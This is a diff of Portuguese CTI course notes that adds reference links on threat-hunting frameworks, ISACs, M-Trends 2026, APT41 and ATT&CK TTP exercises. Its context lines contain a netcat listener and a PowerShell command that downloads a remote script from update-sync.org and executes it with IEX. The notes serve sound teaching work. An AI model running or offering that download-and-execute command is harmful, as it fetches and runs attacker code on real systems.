@@ -411,3 +411,96 @@ nc -nlvp 443
 ```
 powershell "(New-Object System.Net.WebClient).DownloadString('http://update-sync.org/pos1.ps1')|IEX"
 ```
+
+## 02.6. TaHiTI - Caça Direcionada integrando Inteligência de Ameaças
+Leia mais sobre TaHiTI e MaGMa:
+
+https://huntbook.predefender.com/part-1/frameworks/threathunting/tahiti/index.html
+
+https://huntbook.predefender.com/part-1/frameworks/threathunting/magma/index.html
+
+https://medium.com/adarma-tech-blog/att-ck-use-cases-with-magma-3a5c83775d86
+
+https://www.betaalvereniging.nl/wp-content/uploads/2026/03/FI-ISAC-use-case-framework-verkorte-versie.pdf
+
+https://www.nvb.nl/themas/veilig-bankieren/fi-isac/magma/
+
+
+## 04.4. ISACs: centros de compartilhamento por setor
+
+No Brasil, há iniciativas recentes para formalizar ISACs em setores como energia, saúde, finanças e telecomunicações, conforme diretrizes do GSI/PR.
+
+Fonte: https://csirt.df.gov.br/isacs-no-brasil-um-novo-marco-para-a-seguranca-cibernetica-nacional/
+
+
+## 05. Análise de um Relatório de CTI
+
+Modelo CTI 101 Karaven Security
+
+https://kravensecurity.com/cti-report-writing/
+
+
+## 05.1. Exemplo: Relatório da Mandiant 2026
+
+Principais conclusões do M‑Trends 2026
+
+https://github.com/thiagosmith/pos-cti-adint/blob/main/Modulo01/Extra/m-trends-2026-en.pdf
+
+https://cloud.google.com/blog/topics/threat-intelligence/m-trends-2026/
+
+https://industrialcyber.co/reports/m-trends-2026-reveals-threat-landscape-shaped-by-faster-coordinated-and-industrialized-cyberattacks/
+
+https://services.google.com/fh/files/misc/m-trends-2026-executive-edition-en.pdf
+
+https://www.hedgehogsecurity.co.uk/blog/apt41
+
+https://labs.withsecure.com/publications/ivanti-epmm-exploitation
+
+https://labs.watchtowr.com/someone-knows-bash-far-too-well-and-we-love-it-ivanti-epmm-pre-auth-rces-cve-2026-1281-cve-2026-1340/
+
+https://aviatrix.ai/threat-research-center/silver-dragon-2026-apt41-phishing-legitimate-services/
+
+https://www.redsheepsec.com/trends/apt41-turns-google-calendar-into-a-covert-c2-channel-with-toughprogress-malware
+
+anavem.com/en/news/cybersecurity/lazarus-group-deploys-medusa-ransomware-in-new-campaign
+
+
+## 05.5. Playbook de Resposta: Ameaças ao setor de Manufatura no Brasil
+
+https://github.com/thiagosmith/pos-cti-adint/blob/main/Modulo01/Extra/Ameacas-ciberneticas-ao-setor-de-Manufatura-no-Brasil-2.pdf
+
+
+## 05.6. Exercício Playbook de Resposta: APT41 (TOUGHPROGRESS, 2026)
+
+Referencias: 
+
+https://www.redsheepsec.com/trends/apt41-turns-google-calendar-into-a-covert-c2-channel-with-toughprogress-malware
+
+https://socradar.io/blog/apt41-toughprogress-malware-google-calendar/****
+
+
+## 06.1. Demonstração prática: importar TTPs do relatório da Mandiant.
+
+Fontes: 
+
+https://cloud.google.com/blog/topics/threat-intelligence/m-trends-2025/
+
+https://mitre-attack.github.io/attack-navigator/
+
+https://github.com/thiagosmith/ttps/blob/main/apt.json
+
+
+## 07.7. Atividade: Caçada a Ameaças Avançadas com CTI – CHERNOVITE (PIPEDREAM)
+
+https://raw.githubusercontent.com/thiagosmith/ttps/refs/heads/main/CHERNOVITE.json
+
+
+
+
+
+
+
+
+
+
+
